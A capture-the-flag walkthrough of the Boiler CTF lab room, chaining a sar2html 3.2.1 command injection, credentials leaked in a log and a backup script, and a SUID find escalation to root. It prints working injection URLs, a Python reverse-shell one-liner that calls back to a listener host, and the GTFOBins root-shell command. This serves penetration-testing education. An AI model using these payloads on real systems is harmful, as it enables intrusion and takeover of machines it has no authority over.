Boiler CTF: a sar2html RCE to a SUID find root shell

This room buries the real path behind a pile of deliberate decoys, a Joomla login not worth brute-forcing, an FTP file that goes nowhere, an encoded robots.txt. The actual way in is a years-old remote code execution bug in a monitoring tool called sar2html, reached through a Joomla subdirectory, which leaks SSH credentials straight out of a log file.

Room: Boiler CTF Category: Web / Linux Privesc Tools: gobuster, sar2html RCE, linpeas, GTFOBins

The setup: an Apache/Joomla box with a known-vulnerable reporting tool exposed in a subdirectory, and a chain of reused credentials sitting underneath it. The job: find the one real path through a room built to waste time on the wrong ones.

The Investigation

1
Scan, then map the web root
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8

A directory scan against port 80 finds two real subdirectories worth following:

/.htpasswd             (Status: 403)
/.hta                   (Status: 403)
/.htaccess              (Status: 403)
/index.html             (Status: 200)
/joomla                 (Status: 301)
/manual                 (Status: 301)
/robots.txt             (Status: 200)
/server-status          (Status: 403)
Why this works

Four open services (FTP, two web ports, SSH on a nonstandard port) is a lot of surface. Mapping the directory structure of the one serving real content first is what turns "four services" into "one subdirectory worth investigating."

2
Recognize the decoys and move past them

This room front-loads several dead ends on purpose. robots.txt discloses a pile of disallowed paths and an encoded number string that needs a shift-cipher decoder to even read, none of it leads anywhere useful. The Joomla admin login at /joomla/administrator/ has no public exploit for its version, so brute-forcing it isn't the intended path either. FTP's anonymous login turns up an .info.txt file that's equally a dead end, though it's worth learning the trick for reading a file over FTP without actually downloading it:

get .info.txt -

(the trailing - prints the file's contents directly instead of saving it locally). A couple of other Joomla subpaths show more red-herring content in the same vein.

Why this works

A room (or a real target) that surfaces several plausible-looking paths is testing whether time gets spent chasing all of them equally, or whether effort gets redirected once a path stops producing anything concrete. robots.txt and anonymous FTP are both worth the first look, just not an unlimited one.

3
Find the real vulnerable app and its public exploit

A further Joomla subdirectory serves sar2html, a system performance report generator. A quick search for its name turns up a public remote code execution advisory for version 3.2.1:

# Exploit Title: sar2html Remote Code Execution
# Date: 01/08/2019
# Software Link: https://sourceforge.net/projects/sar2html/
# Version: 3.2.1

In web application you will see index.php?plot url extension.

http://<ipaddr>/index.php?plot=;<command-here> will execute
the command you entered.
Why this works

sar2html's plot parameter gets passed straight into a shell command with no sanitization. Prefixing a second command with ; after the expected value just chains an arbitrary command onto the one the application meant to run.

4
Confirm it, then read a log file straight into SSH creds

A quick ls through the parameter confirms the injection works, then reading a log file in the same directory pays off immediately:

http://10.10.40.30/joomla/_test/index.php?plot=;ls
http://10.10.40.30/joomla/_test/index.php?plot=;cat log.txt

The log contains an SSH auth line with the password spelled out in a trailing comment:

Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$

That logs straight in over the nonstandard SSH port found in the initial scan:

ssh basterd@10.10.40.30 -p55007
basterd@10.10.40.30's password: superduperp@$$
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)
Why this works

Command injection through a URL parameter is as good as a shell, reading an arbitrary file is often faster and quieter than spawning a reverse shell outright, and here it happened to land directly on a credential, no further exploitation needed.

5
Pivot to a second user via a reused password

A backup script sitting in the current directory, readable, names a different user and embeds the same password pattern again as a comment:

-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh

cat backup.sh
REMOTE=1.2.3.4
SOURCE=/home/stoner
TARGET=/usr/local/backup
LOG=/home/stoner/bck.log
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE

That password, suffixed slightly differently, is stoner's real login as well. Logged in as stoner, Joomla's own config file is readable too (a dead end here, no further use found for these particular credentials, but worth checking on any Joomla box):

cat /var/www/html/joomla/configuration.php
public $host     = '127.0.0.1';
public $user     = 'joomlauser';
public $password = 'passwordz';
public $db       = 'joomladb';
public $secret   = '5O2SmJUZB24rhcfL';
Why this works

A password reused across two accounts, even with a trailing comment appended as a throwaway note, is still the same password. Scripts that automate privileged actions (backups, deploys) are a common place to find credentials left in plaintext for convenience.

6
Find the SUID binary with linpeas
scp -P55007 linpeasv3_2.sh stoner@10.10.40.30:/tmp/linpeas.sh

Among the SUID binaries it finds, one stands out from the usual system set:

[+] SUID - Check easy privesc, exploits and write perms
-rwsr-xr-x 1 root root   43K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root   39K May  7  2014 /bin/ping
-rwsr-sr-x 1 daemon daemon 50K Jan 15 2016 /usr/bin/at
-r-sr-xr-x 1 root root  227K Feb  8  2016 /usr/bin/find
Why this works

find with the SUID bit set is one of the most immediately exploitable entries any SUID scan can turn up, it's a well-documented GTFOBins entry, not an edge case that needs custom exploitation.

7
GTFOBins straight to root
/usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
Why this works

find's -exec flag runs an arbitrary command, and with the SUID bit set that command inherits root's privileges. -p on the spawned shell preserves that elevated privilege instead of dropping it, and GTFOBins exists precisely to catalog one-liners like this for every common SUID binary.

8
Alternate path: skip straight to a reverse shell

Rather than manually reading files one command at a time through the plot parameter, the same injection can launch an interactive shell directly. With a listener running locally, a one-liner Python reverse shell pasted straight into the URL connects back immediately:

http://10.10.37.31/joomla/_test/index.php?plot=;python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.2.57.21",4750));[os.dup2(s.fileno(),f)for f in (0,1,2)];pty.spawn("sh")'
nc -lvnp 4750
connect to [10.2.57.21] from (UNKNOWN) [10.10.37.31] 51722
$ whoami
www-data
Why this works

Any command injection is a reverse shell waiting to be asked for one. Reading individual files first (as in the main chain) is often preferable for a quieter footprint, but a direct shell works just as well and gets to the same place.

Full Attack Chain

nmap: FTP, HTTP, Webmin, SSH on a nonstandard port
  → gobuster: /joomla found, robots.txt and FTP confirmed as decoys
       → /joomla/_test: sar2html 3.2.1, known RCE via ?plot=
            → ?plot=;cat log.txt: basterd's SSH password leaked in a log
                 → ssh basterd@<target> -p55007
                      → backup.sh: same password reused by stoner
                           → linpeas: /usr/bin/find has the SUID bit
                                → GTFOBins find one-liner: root

Takeaways

Not every disclosed path is worth chasing

This room's robots.txt and anonymous FTP access were both real findings that led nowhere. Recognizing a dead end and moving on is as much a skill as finding the real path.

Old, rarely-updated monitoring tools are common RCE sources

sar2html isn't WordPress or Joomla itself, it's a secondary tool someone installed and forgot about. Secondary, rarely-audited software is frequently where the real vulnerability sits.

Log files and backup scripts are a credential goldmine

Both the initial foothold and the privilege pivot in this room came from reading plaintext credentials left in operational files, not from exploiting anything further.

Check GTFOBins before writing custom exploitation

A SUID binary that appears in GTFOBins has a documented, tested one-liner. There's rarely a need to improvise once the binary's there.
